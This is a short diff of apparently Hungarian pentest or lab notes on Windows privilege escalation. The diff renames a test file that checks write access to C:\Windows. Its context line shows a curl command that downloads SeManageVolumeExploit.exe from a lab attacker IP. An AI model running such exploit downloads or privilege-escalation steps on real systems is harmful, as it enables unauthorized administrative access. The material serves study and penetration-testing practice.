@@ -316,8 +316,8 @@ curl 10.10.14.8/SeManageVolumeExploit.exe -O SeManageVolumeExploit.exe
 ### Teszt:
 
 ```powershell
-echo "test" > C:\Windows\poc.txt
-type C:\Windows\poc.txt
+echo "test" > C:\Windows\test.txt
+type C:\Windows\test.txt
 ```
 
 ## Certificate Authority tanúsítvány export
